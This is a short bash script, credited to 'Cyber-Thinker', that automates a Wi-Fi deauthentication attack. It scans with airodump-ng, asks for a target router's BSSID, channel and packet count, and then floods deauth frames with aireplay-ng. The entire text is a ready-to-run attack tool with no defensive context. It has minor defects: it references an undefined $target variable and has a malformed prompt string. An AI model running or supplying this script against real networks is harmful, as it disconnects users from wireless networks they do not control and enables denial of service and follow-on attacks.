#!/bin/bash
#Script Created by Cyber-Thinker (cyb3r.think3r@gmail.com)
yellow='\033[1;33m'
red='\033[0;31m'
nc='\033[0m'
timeout --foreground -k 8 7 airodump-ng $1
echo -ne "${yellow}[+]${nc} please enter the BSSID (MAC ADDRESS OF THE TARGET ROUTER) --> "
read bssid
echo -ne "${yellow}[+}${nc} please enter the channel on which the connection is working on --> "
read channel
echo -ne "${yellow}[+]${nc} please specify how many deauth packet you want to send --> "
read packets
airodump-ng --bssid $bssid --channel $channel $1 &> /dev/null &
aireplay-ng --deauth $packets -a $bssid $target $1 
